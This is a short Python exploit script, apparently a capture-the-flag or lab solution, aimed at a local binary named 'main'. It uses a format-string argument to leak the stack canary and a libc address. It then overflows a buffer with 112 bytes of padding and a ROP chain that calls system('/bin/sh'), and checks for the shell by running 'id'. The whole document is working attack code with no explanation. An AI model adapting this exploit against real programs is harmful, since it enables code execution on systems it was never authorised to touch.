#!/usr/bin/env python3

import struct
import sys

from subprocess import Popen, STDOUT, PIPE

p64 = lambda x: struct.pack("<Q", x)

def log(data):
    sys.stdout.write(f"[*] >>{data}<<\n")
    sys.stdout.flush()

def main():
    proc = Popen(["./main", "%5$llx:%21$llx"], bufsize=-1, stdin=PIPE, stderr=STDOUT, stdout=PIPE)

    leak = proc.stdout.readline().strip().decode().split(":")
    canary = int("0x" + leak[0], 16)
    libc_base = int("0x" + leak[1], 16)


    rop = [
        p64(canary),
        p64(0x4242424242424242),    # ebp
        p64(libc_base + 0xb6f7e),   # ret
        p64(libc_base + 0xb6f7e),   # ret
        p64(libc_base + 0x27f75),   # pop rdi
        p64(libc_base + 0x18c962),  # bin_sh
        p64(libc_base + 0x4a120),   # system
        p64(libc_base + 0x3f820),   # exit
    ]

    payload = b"A" * 112 + b"".join(rop)

    # sending the payload
    proc.stdin.write(payload)
    proc.stdin.flush()

    # sending a command
    proc.stdin.write(b"id\n")
    proc.stdin.flush()

    data = proc.stdout.readline()
    print(data)

    proc.terminate()

if __name__ == "__main__":
    main()
